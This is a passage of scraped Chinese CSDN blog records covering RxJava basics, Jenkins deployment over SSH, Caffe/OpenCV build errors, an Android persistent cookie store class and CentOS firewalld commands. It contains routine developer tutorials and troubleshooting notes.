observer.onNext(state);\n                observer.onCompleted();\n                observer.onError(new Throwable(\"onError\"));\n                return state;\n            }\n        }).subscribe(new Action1<String>() {\n            @Override\n            public void call(String s) {\n                Log.d(\"Rxjava demo\", s);\n            }\n        }, new Action1<Throwable>() {\n            @Override\n            public void call(Throwable throwable) {\n                Log.d(\"Rxjava demo\", throwable.getMessage());\n            }\n        }, new Action0() {\n            @Override\n            public void call() {\n                Log.d(\"Rxjava demo\", \"onComplete\");\n            }\n        });\n\n但是可以看出来多了两种回调方法： \n- generateState()，这个方法会在subscribe的时候调用，产生一个state值，这个值会在第一次迭代的时候传递到next(S state, Observer observer) 方法中，后续迭代下将收到由先前的调用返回下一个状态。也就是会收到next(S state, Observer observer)的返回值\n\n\nnext(S state, Observer observer)中会收到上游传来的数据，并通过observer.onNext方法传递到下游。但是该方法的实现必须遵循以下规则：(1)observer.onNext(t)不能超过1次调用。(2)不能同时调用observer.onNext(t)。 \nnext(S state, Observer observer)会返回下一次迭代的状态值（state）给generateState()，然后generateState()再把值传递给next(S state, Observer observer)，如果你没有调用onComplete或者onError，这个循环会一直下去\n\n\n好了，Rxjava简单的介绍就到这里了，下次我们会介绍Rxjava最强大的地方，也就是Rxjava操作符。\n\n原文地址", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/changmu175/article/details/79313602", "title": "面试神器第一弹：Rxjava破冰——初步认识Rxjava"}
{"timestamp": "2018_08_14_11_13_10", "desc": "Publish Over SSH插件使用\n\n在使用Publish Over SSH之前，需要制作SSH私钥。机器间做免密登录配置。假设机器A,ip为192.168.AA.AAA,机器B: 192.168.BB.BBB,机器A能够免密登录机器B,机器B能够免密登录机器A,制作方式是： \n进入A机器，执行：\n\ncd ~\nssh-keygen -t rsa\n\n通过下面的命令，表示可以通过机器192.168.AA.AAA免密登录到机器192.168.BB.BBB\n\nssh-copy-id 192.168.BB.BBB\n\n \n验证方式是：在A机器上执行ssh 192.168.BB.BBB,然后执行ifconfig检查当前的ip,若发现机器的ip已经变成了192.168.BB.BBB说明免密登录设置成功。\n\n进入B机器，执行：\n\ncd ~\nssh-keygen -t rsa\nssh-copy-id 192.168.AA.AAA\n\n验证方式是：在B机器上执行ssh 192.168.AA.AAA,然后执行ifconfig检查当前的ip,若发现机器的ip已经变成了192.168.BB.BBB说明免密登录设置成功。\n\n在系统配置中配置Publish Over SSH\n\n进入Jenkins—>系统管理—>系统设置，配置Publish over SSH \n  \n参数说明：\n\nPassphrase：密码（key的密码，如果你设置了）\nPath to key：key文件（私钥）的路径\nKey：将私钥复制到这个框中\nDisable exec：禁止运行命令\n私有配置：\nSSH Server Name：标识的名字（随便你取什么）\nHostname：需要连接ssh的主机名或ip地址（建议ip）\nUsername：用户名\nRemote Directory：远程目录\nUse password authentication, or use a different key：可以替换公共配置（选中展开的就是公共配置的东西，这样做扩展性很好）\n私有配置的高级：\nPort：端口（默认22）\nTimeout (ms)：超时时间（毫秒）默认即可\nDisable exec：禁止运行命令\nTest Configuration：测试连接\n\n对构建的项目中的SSH进行配置：\n\n在执行前要配合Build–>Post Steps中的Execute shell配置，执行scp命令，将要拷贝的项目先远程拷贝到远程机器上。在Execute shell中的内容如下：\n\nscp -r /root/.jenkins/workspace/youxuan_api_pre/qt360-web/target/youxuan_api root@192.168.BB.BBB:/usr/local/jenkinsTempFolder/\nexport BUILD_ID=DONTKILLME\n\n点击构建的项目—>配置–>构建后操作，选择Send build artifacts over SSH，进行如下配置(注意：下面的Exec command是远程机器上执行的脚本)： \n \n\n脚本内容如下：\n\n#!/bin/bash\necho \"==================start deploy project=========================\"\nps -aux | grep /usr/local/tomcat/ | grep -v grep > tomcat_info.txt\nsed 's/  / /g' tomcat_info.txt > tomcat_info1.txt\nsed 's/  / /g' tomcat_info1.txt > tomcat_info.txt\nsed 's/  / /g' tomcat_info.txt > tomcat_info1.txt \ncat tomcat_info1.txt | cut -d' ' -f 2 > tomcat_info.txt\n\nfor line in `cat tomcat_info.txt`\ndo\n    kill -9 $line\ndone\n\ncd /usr/local/tomcat/webapps\nrm -rf youxuan_api*\nmv /usr/local/jenkinsTempFolder/youxuan_api /usr/local/tomcat/webapps\n\n/etc/init.d/tomcat start\nsync\necho 3 > /proc/sys/vm/drop_caches\necho \"==================deploy project success=========================\"\n\n参数说明：\n\n\n\nSSH  Server Name：选个一个你在系统设置里配置的配置的名字\n\nTransfer Set Source files：需要上传的文件（注意：相对于工作区的路径。看后面的配置可以填写多个，默认用,分隔）\n\nRemove prefix：移除目录（只能指定Transfer Set Source files中的目录）\n\nRemote directory：远程目录（根据你的需求填写吧，因为我这儿是测试,所以偷懒没有填写。默认会继承系统配置）\n\nExec command：把你要执行的命令写在里面\n\n（新版本的要求Transfer Set Source files和Exec command都要填写，可以不了他。老版本的允许只填写一个）\n\n高级：\n\nExclude files：排除的文件（在你传输目录的时候很有用，使用通配符，例如：**/*.log,**/*.tmp,.git/）\n\nPattern separator：分隔符（配置Transfer Set Source files的分隔符。如果你这儿更改了，上面的内容也需要更改）\n\nNo default excludes：禁止默认的排除规则（具体的自己看帮助）\n\nMake empty dirs：此选项会更改插件的默认行为。默认行为是匹配该文件是否存在，如果存在则创建目录存放。选中此选项会直接创建一个目录存放文件，即使是空目录。（个人理解）\n\nFlatten files：只上传文件，不创建目录（除了远程目录）\n\nRemote directory is a date format:远程目录建立带日期的文件夹（需要在Remote directory中配置日期格式），具体格式参考下表：\n\nRemote directory    Directories created\n'qa-approved/'yyyyMMddHHmmss    qa-approved/20101107154555\n'builds/'yyyy/MM/dd/'build-${BUILD_NUMBER}'    builds/2010/11/07/build-456 (if the build was number 456)\nyyyy_MM/'build'-EEE-d-HHmmss    2010_11/build-Sun-7-154555\nyyyy-MM-dd_HH-mm-ss 2010-11-07_15-45-55\n\nExec timeout (ms)：运行脚步的超时时间（毫秒）\n\nExec in pty：模拟一个终端执行脚步\n\nAdd Transfer Set：增加一个配置", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/tototuzuoquan/article/details/78568655", "title": "jenkins中通过Publish Over SSH将项目部署到远程机器上"}
{"timestamp": "2018_08_14_11_13_10", "desc": "最近安装了caffe的Linux版本。\n\n1.操作系统最好使用ubuntu desktop 14.04 64位。\n\n2.剩下的就按caffe官网安装caffe的方法安装就行了，一路顺畅。\n\n顺便提醒一下，caffe没有说要安装opencv，这个是需要安装的，可以在所以安装完毕后，安装opencv。\n\n3.opencv安装，\n\n4.1ffmpeg：\n\nsudo add-apt-repository ppa:kirillshkrogalev/ffmpeg-next \nsudo apt-get update \nsudo apt-get install ffmpeg\n\n4.2 No rule to make target /usr/lib/x86_64-linux-gnu/libGL.so', needed bylib/libopencv_core.so.2.4.11’.  Stop.\n\n解决方法，删除旧的，然后，重新定向\n\nln -s /usr/lib/x86_64-linux-gnu/libGL.so /usr/lib/libGL.so.1\n\n4.3make j导致电脑死机\n\n改用make，而不适用make j\n\n4.4以上就是OpenCV安装全过程，安装过程中可能碰到一些问题，例举一些。\n\n在编译的过程中可能会碰到找不到Qt5文件的情况，只是一个警告可以不理，如果有强迫症的同学可以安装一下Qt5\n\nCMake Warning at cmake/OpenCVFindLibsGUI.cmake:18 (find_package): \n  By not providing “FindQt5Core.cmake” in CMAKE_MODULE_PATH this project has \n  asked CMake to find a package configuration file provided by “Qt5Core”, but \n  CMake did not find one.\n\n另一个是ICV hash校验值不符的问题\n\nCMake Warning at 3rdparty/ippicv/downloader.cmake:54 (message): \n  ICV: Local copy of ICV package has invalid MD5 hash: \n  0103b909e19ca9c6497a7ae696c16480 (expected: \n  8b449a536a2157bcad08a2b9f266828b) \nCall Stack (most recent call first): \n  3rdparty/ippicv/downloader.cmake:108 (_icv_downloader) \n  cmake/OpenCVFindIPP.cmake:235 (include) \n  cmake/OpenCVFindLibsPerf.cmake:12 (include) \n  CMakeLists.txt:526 (include)\n\n– ICV: Downloading ippicv_linux_20141027.tgz… \nCMake Error at 3rdparty/ippicv/downloader.cmake:71 (file): \n  file DOWNLOAD HASH mismatch\n\nfor file: [/home/jason/program/opencv-3.0.0/3rdparty/ippicv/downloads/linux-8b449a536a2157bcad08a2b9f266828b/ippicv_linux_20141027.tgz]\n  expected hash: [8b449a536a2157bcad08a2b9f266828b]\n    actual hash: [0103b909e19ca9c6497a7ae696c16480]\n\n\nCall Stack (most recent call first): \n  3rdparty/ippicv/downloader.cmake:108 (_icv_downloader) \n  cmake/OpenCVFindIPP.cmake:235 (include) \n  cmake/OpenCVFindLibsPerf.cmake:12 (include) \n  CMakeLists.txt:526 (include)\n\n之后查了很多资料也没有发现也不知道该怎么解决，后来去查了一下代码，发现这个是下载ippicv_linux_20141027.tgz时的校验和不符，查看了配置文件，发现可以自行从http://sourceforge.net/projects/opencvlibrary/files/3rdparty/ippicv这里下载，奇怪的是编译时从这里下载的文件和自己下载的文件校验值居然不一样，也真是神奇，将下载的文件\n\n~/opencv-3.0.0/3rdparty/ippicv/downloads/linux-8b449a536a2157bcad08a2b9f266828b ,代替原来的同名文件，ok问题解决。\n\n另外对与cuda8.0，opencv3.0或者2.4.10都会报如下错误，使用opencv2.4.13就没有问题。(唯一一个2016年发布的版本)\n\nUbuntu/3.0/OpenCV/opencv-3.0.0/modules/cudalegacy/src/graphcuts.cpp:120:54: error: ‘NppiGraphcutState’ has not been declared \n     typedef NppStatus (init_func_t)(NppiSize oSize, NppiGraphcutState* ppState, Npp8u* pDeviceMem);\n\n5.建议安装Anaconda包，这个包能独立于系统自带的Python库，并且提供大部分Caffe需要的科学运算Python库。这里需要注意，在运行Caffe时，可能会报一些找不到libxxx.so的错误，而用 locate libxxx.so命令发现已经安装在anaconda中，这时首先想到的是在/etc/ld.so.conf.d/ 下面将 $your_anaconda_path/lib 加入 LD_LIBRARY_PATH中。 但是这样做可能导致登出后无法再进入桌面！！！原因（猜测）可能是anaconda的lib中有些内容于系统自带的lib产生冲突。\n\n正确的做法是：为了不让系统在启动时就将anaconda/lib加入系统库目录，可以在用户自己的~/.bashrc 中添加library path， 比如我就在最后添加了两行\n\n\n\nadd library path\n\nLD_LIBRARY_PATH=your_anaconda_path/lib:$LD_LIBRARY_PATH \nexport LD_LIBRARY_PATH\n\n安装anaconda后再安装opencv会有警告\n\nanaconda2/lib/libcurl.so.4: no version information available\n\n此事需要先屏蔽掉以上环境变量，等编译通过以后再放开。\n\n6.caffe编译\n\n首先按个人需求修改Makefile.config配置文件\n\nmake runtest报错\n\nerror while loading shared libraries: libcudart.so.8.0\n\n在bashrc中添加如下环境变量即可：\n\nLD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda/lib64/\n\nmake时出现的问题：\n\n(1).build_release/lib/libcaffe.so: undefined reference to google::protobuf::internal::WireFormatLite::WriteStringMaybeAliased(int, std::string const&, google::protobuf::io::CodedOutputStream*)’\n\n设置环境变量：LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu/:$LD_LIBRARY_PATH，将/usr/lib/x86_64-linux-gnu/放在最前面\n\n(2)/cudnn.hpp:8:34: fatal error: caffe/proto/caffe.pb.h: No such file or directory\n\nmake all -j8有问题，make all没问题。可能是多核编译的问题。\n\nwin7上安装，就直接按github上的说明安装，vs一定要用2013.这个我学乖了，所有版本按说明来，安装很顺畅。\n\nwin注意点：1.GPU模式下，cuda对显卡的加速能力有要求，cudnn需要加速能力3.0以上，具体要求没找到。我的显卡不太高端，所以我把cudnn禁用了。\n\n2.cuda的在comm中的默认配置加速能力是最低3_5,如果显卡性能达不到，需要修改，我的是3.4M的显卡，所以我改成了3_0。 \n本文部分参考来自：原文\n\n——————————-分割线———————— \nadd:新的错误\n\n\n\nmake\nCXX/LD -o .build_release/tools/upgrade_net_proto_text.bin\n/usr/bin/ld: warning: libpng16.so.16, needed by /home/maxkhk/anaconda/lib/libopencv_highgui.so, not found (try using -rpath or -rpath-link)\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_create_read_struct@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_interlace_handling@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_IHDR@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_get_io_ptr@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_longjmp_fn@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_gray_to_rgb@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_compression_level@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_bgr@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_filter@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_rgb_to_gray@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_init_io@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_destroy_read_struct@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_swap@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_get_IHDR@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_palette_to_rgb@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_compression_strategy@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_get_tRNS@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_write_info@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_packing@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_read_fn@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_create_info_struct@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_read_end@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_read_update_info@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_write_image@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_write_end@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_expand_gray_1_2_4_to_8@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_create_write_struct@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_read_image@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_read_info@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_strip_alpha@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_set_write_fn@PNG16_0'\n/home/maxkhk/anaconda/lib/libopencv_highgui.so: undefined reference to `png_destroy_write_struct@PNG16_0'\n\n解决办法： \n在caffe目录下的Makefile.config文件中，加入一行：\n\n\n\nLINKFLAGS := -Wl,-rpath,$(HOME)/anaconda/lib\n\n这里的$(HOME)/anaconda/lib也可以改成你的anaconda完整路径，如/home/qwei/anaconda2/lib \nStackOverflow：讨论帖\n\nadd：错误： \n: fatal error: caffe/proto/caffe.pb.h: No such file or directory \n这是因为make all -j32这里的32太大了，数据交换来不及，改成make all -j8就行 \ngithub讨论\n\nadd：如果在使用caffe、或者编译安装caffe过程中，出现如下错误：\n\n\n\nCXX/LD -o .build_release/tools/convert_imageset.bin\n.build_release/lib/libcaffe.so: undefined reference tocv::imread(cv::String const&, int)'.build_release/lib/libcaffe.so: undefined reference tocv::imencode(cv::String const&, cv::_InputArray const&, std::vector >&, std::vector > const&)'\n\n\n那么请修改上面的Makefile文件（注意不是不是不是Makefile.config！！！）：\n\n\n\nLIBRARIES += glog gflags protobuf leveldb snappy \\\nlmdb boost_system hdf5_hl hdf5 m \\\nopencv_core opencv_highgui opencv_imgproc opencv_imgcodecs\n\nadd：错误： \nundefined reference to cv::videocapture::videocapture() \n或者io.cpp:86: undefined reference tocv::imread(cv::String const\n\n找了半天也没找到这种问题的答案，最后在：github issue里面找到了 \n解决方案：\n\n\n\nWhen compiling with OpenCV 3.0 or errors show imread,imencode,imdecode or VideoCapture open your Makefile with some text editor, add opencv_imgcodecs behind.\n\nLIBRARIES += glog gflags protobuf leveldb snappy \n lmdb boost_system boost_filesystem hdf5_hl hdf5 m \n opencv_core opencv_highgui opencv_imgproc opencv_imgcodecs opencv_videoio\n\n(See the discussion at: #1276)\n\n\nadd 新的错误：\n\n\n\n /usr/bin/ld: cannot find -lopencv_imgcodecs\n\n解决办法，对于opencv3以下的版本不需要在Makefile中加入opencv_imgcodecs  \n见github讨论 \n这里写链接内容\n\n\n\nadd 新的错误：\n\n\n\n\nbuild/lib/libcaffe.a(image_io.o): In function caffe::ReadVideoToVolumeDatum(char const*, int, int, int, int, int, int, caffe::VolumeDatum*)': image_io.cpp:(.text+0x1905): undefined reference tocv::VideoCapture::VideoCapture()'\n\nimage_io.cpp:(.text+0x1abe): undefined reference to cv::VideoCapture::open(cv::String const&)' image_io.cpp:(.text+0x1ace): undefined reference tocv::VideoCapture::isOpened() const'\n\nimage_io.cpp:(.text+0x1c91): undefined reference to cv::VideoCapture::~VideoCapture()' image_io.cpp:(.text+0x1d22): undefined reference tocv::VideoCapture::get(int) const'\n\nimage_io.cpp:(.text+0x1d6d): undefined reference to cv::VideoCapture::set(int, double)' image_io.cpp:(.text+0x1de1): undefined reference tocv::VideoCapture::set(int, double)'\n\nimage_io.cpp:(.text+0x1e35): undefined reference to cv::VideoCapture::read(cv::_OutputArray const&)' image_io.cpp:(.text+0x1f7e): undefined reference tocv::VideoCapture::release()'\n\nimage_io.cpp:(.text+0x1fc3): undefined reference to cv::VideoCapture::read(cv::_OutputArray const&)' image_io.cpp:(.text+0x22e9): undefined reference tocv::VideoCapture::~VideoCapture()'\n\ncollect2: error: ld returned 1 exit status\n\nmake: *** [build/tools/blob_proto_to_blob_binary.bin] Error 1\n\nmake: *** Waiting for unfinished jobs....\n\n\n解决方案：\n\n\n\n在Makefile 中继续添加：opencv_videoio \n\nLIBRARIES += glog gflags protobuf leveldb snappy \n lmdb boost_system boost_filesystem hdf5_hl hdf5 m \n opencv_core opencv_highgui opencv_imgproc opencv_imgcodecs opencv_videoio", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/u014381600/article/details/54090467", "title": "caffe安装错误总结（cuda，cudnn，ffmpeg错误，cudnn.hpp:8:34）"}
{"timestamp": "2018_08_14_11_13_10", "desc": "1 以下有两种方法\n\n第一种方法是针对Volley来实现的，这种方法比较简单，但是对于有多重类型的Request必须都要按照这种方式来处理，耦合度比较高。\n\n第二种方法只要设置一次，之后所有的请求都会携带cookie。建议采用第二种方法\n\n\n\n2 第二种方式：CookieManager 和自定义的CookieStore\n\nCookieManager会帮我们管理本地Java应用的cookie，我们只需要实现自定义 CookieStore就能实现持久化的Cookie。\n\nPersistentCookieStore.java\n\npackage com.bld.club.net;\n\nimport android.content.Context;\nimport android.content.SharedPreferences;\nimport android.text.TextUtils;\nimport android.util.Log;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.Serializable;\nimport java.net.CookieStore;\nimport java.net.HttpCookie;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\n/**\n * Cookie持久化\n * <p/>\n * Created by guan on 16/9/20.\n */\npublic class PersistentCookieStore implements CookieStore {\n\n    private static final String LOG_TAG = \"PersistentCookieStore\";\n    private static final String COOKIE_PREFS = \"CookiePrefsFile\";\n    private static final String COOKIE_NAME_PREFIX = \"cookie_\";\n\n    private final HashMap<String, ConcurrentHashMap<String, HttpCookie>> cookies;\n    private final SharedPreferences cookiePrefs;\n\n    /**\n     * Construct a persistent cookie store.\n     *\n     * @param context Context to attach cookie store to\n     */\n    public PersistentCookieStore(Context context) {\n        cookiePrefs = context.getSharedPreferences(COOKIE_PREFS, 0);\n        cookies = new HashMap<String, ConcurrentHashMap<String, HttpCookie>>();\n\n        // Load any previously stored cookies into the store\n        Map<String, ?> prefsMap = cookiePrefs.getAll();\n        for (Map.Entry<String, ?> entry : prefsMap.entrySet()) {\n            if (((String) entry.getValue()) != null && !((String) entry.getValue()).startsWith(COOKIE_NAME_PREFIX)) {\n                String[] cookieNames = TextUtils.split((String) entry.getValue(), \",\");\n                for (String name : cookieNames) {\n                    String encodedCookie = cookiePrefs.getString(COOKIE_NAME_PREFIX + name, null);\n                    if (encodedCookie != null) {\n                        HttpCookie decodedCookie = decodeCookie(encodedCookie);\n                        if (decodedCookie != null) {\n                            if (!cookies.containsKey(entry.getKey()))\n                                cookies.put(entry.getKey(), new ConcurrentHashMap<String, HttpCookie>());\n                            cookies.get(entry.getKey()).put(name, decodedCookie);\n                        }\n                    }\n                }\n\n            }\n        }\n    }\n\n    @Override\n    public void add(URI uri, HttpCookie cookie) {\n        String name = getCookieToken(uri, cookie);\n\n        // Save cookie into local store, or remove if expired\n        if (!cookie.hasExpired()) {\n            if (!cookies.containsKey(uri.getHost()))\n                cookies.put(uri.getHost(), new ConcurrentHashMap<String, HttpCookie>());\n            cookies.get(uri.getHost()).put(name, cookie);\n        } else {\n            if (cookies.containsKey(uri.toString()))\n                cookies.get(uri.getHost()).remove(name);\n        }\n\n        // Save cookie into persistent store\n        SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n        prefsWriter.putString(uri.getHost(), TextUtils.join(\",\", cookies.get(uri.getHost()).keySet()));\n        prefsWriter.putString(COOKIE_NAME_PREFIX + name, encodeCookie(new SerializableCookie(cookie)));\n        prefsWriter.apply();\n    }\n\n    protected String getCookieToken(URI uri, HttpCookie cookie) {\n        return cookie.getName() + cookie.getDomain();\n    }\n\n    @Override\n    public List<HttpCookie> get(URI uri) {\n        ArrayList<HttpCookie> ret = new ArrayList<HttpCookie>();\n        if (cookies.containsKey(uri.getHost()))\n            ret.addAll(cookies.get(uri.getHost()).values());\n        return ret;\n    }\n\n    @Override\n    public boolean removeAll() {\n        SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n        prefsWriter.clear();\n        prefsWriter.apply();\n        cookies.clear();\n        return true;\n    }\n\n\n    @Override\n    public boolean remove(URI uri, HttpCookie cookie) {\n        String name = getCookieToken(uri, cookie);\n\n        if (cookies.containsKey(uri.getHost()) && cookies.get(uri.getHost()).containsKey(name)) {\n            cookies.get(uri.getHost()).remove(name);\n\n            SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n            if (cookiePrefs.contains(COOKIE_NAME_PREFIX + name)) {\n                prefsWriter.remove(COOKIE_NAME_PREFIX + name);\n            }\n            prefsWriter.putString(uri.getHost(), TextUtils.join(\",\", cookies.get(uri.getHost()).keySet()));\n            prefsWriter.apply();\n\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    @Override\n    public List<HttpCookie> getCookies() {\n        ArrayList<HttpCookie> ret = new ArrayList<HttpCookie>();\n        for (String key : cookies.keySet())\n            ret.addAll(cookies.get(key).values());\n\n        return ret;\n    }\n\n    @Override\n    public List<URI> getURIs() {\n        ArrayList<URI> ret = new ArrayList<URI>();\n        for (String key : cookies.keySet())\n            try {\n                ret.add(new URI(key));\n            } catch (URISyntaxException e) {\n                e.printStackTrace();\n            }\n\n        return ret;\n    }\n\n    /**\n     * Serializes Cookie object into String\n     *\n     * @param cookie cookie to be encoded, can be null\n     * @return cookie encoded as String\n     */\n    protected String encodeCookie(SerializableCookie cookie) {\n        if (cookie == null)\n            return null;\n        ByteArrayOutputStream os = new ByteArrayOutputStream();\n        try {\n            ObjectOutputStream outputStream = new ObjectOutputStream(os);\n            outputStream.writeObject(cookie);\n        } catch (IOException e) {\n            Log.d(LOG_TAG, \"IOException in encodeCookie \" + e.toString());\n            return null;\n        }\n\n        return byteArrayToHexString(os.toByteArray());\n    }\n\n    /**\n     * Returns cookie decoded from cookie string\n     *\n     * @param cookieString string of cookie as returned from http request\n     * @return decoded cookie or null if exception occured\n     */\n    protected HttpCookie decodeCookie(String cookieString) {\n        byte[] bytes = hexStringToByteArray(cookieString);\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        HttpCookie cookie = null;\n        try {\n            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);\n            cookie = ((SerializableCookie) objectInputStream.readObject()).getCookie();\n        } catch (IOException e) {\n            Log.d(LOG_TAG, \"IOException in decodeCookie \" + e.toString());\n        } catch (ClassNotFoundException e) {\n            Log.d(LOG_TAG, \"ClassNotFoundException in decodeCookie \" + e.toString());\n        }\n\n        return cookie;\n    }\n\n    /**\n     * Using some super basic byte array &lt;-&gt; hex conversions so we don't have to rely on any\n     * large Base64 libraries. Can be overridden if you like!\n     *\n     * @param bytes byte array to be converted\n     * @return string containing hex values\n     */\n    protected String byteArrayToHexString(byte[] bytes) {\n        StringBuilder sb = new StringBuilder(bytes.length * 2);\n        for (byte element : bytes) {\n            int v = element & 0xff;\n            if (v < 16) {\n                sb.append('0');\n            }\n            sb.append(Integer.toHexString(v));\n        }\n        return sb.toString().toUpperCase(Locale.US);\n    }\n\n    /**\n     * Converts hex values from strings to byte arra\n     *\n     * @param hexString string of hex-encoded values\n     * @return decoded byte array\n     */\n    protected byte[] hexStringToByteArray(String hexString) {\n        int len = hexString.length();\n        byte[] data = new byte[len / 2];\n        for (int i = 0; i < len; i += 2) {\n            data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) << 4) + Character.digit(hexString.charAt(i + 1), 16));\n        }\n        return data;\n    }\n\n    /**\n     * A wrapper class around {@link org.apache.http.cookie.Cookie} and/or {@link org.apache.http.impl.cookie.BasicClientCookie} designed for use in {@link\n     * PersistentCookieStore}.\n     */\n    public class SerializableCookie implements Serializable {\n        private static final long serialVersionUID = 6374381828722046732L;\n\n        private transient final HttpCookie cookie;\n        private transient HttpCookie clientCookie;\n\n        public SerializableCookie(HttpCookie cookie) {\n            this.cookie = cookie;\n        }\n\n        public HttpCookie getCookie() {\n            HttpCookie bestCookie = cookie;\n            if (clientCookie != null) {\n                bestCookie = clientCookie;\n            }\n            return bestCookie;\n        }\n\n        private void writeObject(ObjectOutputStream out) throws IOException {\n            out.writeObject(cookie.getName());\n            out.writeObject(cookie.getValue());\n            out.writeObject(cookie.getComment());\n            out.writeObject(cookie.getDomain());\n            out.writeObject(cookie.getPath());\n            out.writeInt(cookie.getVersion());\n            out.writeBoolean(cookie.getSecure());\n        }\n\n        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {\n            String name = (String) in.readObject();\n            String value = (String) in.readObject();\n            clientCookie = new HttpCookie(name, value);\n            clientCookie.setComment((String) in.readObject());\n            clientCookie.setDomain((String) in.readObject());\n            clientCookie.setPath((String) in.readObject());\n            clientCookie.setVersion(in.readInt());\n            clientCookie.setSecure(in.readBoolean());\n        }\n    }\n}\n\n只要在网络请求之前调用这个方法，就可以将自定义的CookieStore设置到CookieManager中，CookieManager会在之后的HTTP请求中自动的帮我们处理response中cookie。通常在Application启动的时候调用上面的设置代码。\n\nApp.java\n\npackage com.bld.club.application;\n\n/**\n * App\n * <p/>\n * Created by guan on 16/9/14.\n */\npublic class App extends Application {\n\n    private static App instance;\n\n    public static App getInstance() {\n        return instance;\n    }\n\n    @Override\n    public void onCreate() {\n        super.onCreate();\n        instance = this;\n        NetworkRequest.init(this);\n\n        initCookie();//初始化Cookie\n    }\n\n    /**\n     * 初始化Cookie\n     */\n    private void initCookie() {\n        CookieManager manager = new CookieManager(new PersistentCookieStore(this),\n                CookiePolicy.ACCEPT_ALL);\n        CookieHandler.setDefault(manager);\n    }\n}", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/chenliguan/article/details/52604944", "title": "Android进阶之Cookie的持久化"}
{"timestamp": "2018_08_14_11_13_10", "desc": "CentOS 7.0默认使用的是firewall作为防火墙， 使用systemctl来管理服务和程序，包括了service和chkconfig\n\n1、查看默认防火墙状态（关闭后显示not running，开启后显示running）\n\n[root@localhost ~]# firewall-cmd --state\nnot running\n\n\n2、检查防火墙的状态\n\n[root@localhost ~]# systemctl list-unit-files|grep firewalld.service\nfirewalld.service                             disabled\n或者：\n[root@localhost ~]# systemctl status firewalld.service\n● firewalld.service - firewalld - dynamic firewall daemon\nLoaded: loaded (/usr/lib/systemd/system/firewalld.service; disabled; vendor preset: enabled)\nActive: inactive (dead)                 --表示防火墙已经关闭\n  Docs: man:firewalld(1)\n\n\n3、开启防火墙\n\n[root@localhost ~]#systemctl start firewalld.service       --启动firewall\n[root@localhost ~]# systemctl enable firewalld.service     --开机时启动firewall\nCreated symlink from /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service to /usr/lib/systemd/system/firewalld.service.\nCreated symlink from /etc/systemd/system/multi-user.target.wants/firewalld.service to /usr/lib/systemd/system/firewalld.service. \n\n\n4、关闭防火墙：\n\n[root@localhost ~]#systemctl stop firewalld.service            --停止firewall\n[root@localhost ~]# systemctl disable firewalld.service        --禁止firewall开机启动\nRemoved symlink /etc/systemd/system/multi-user.target.wants/firewalld.service.\nRemoved symlink 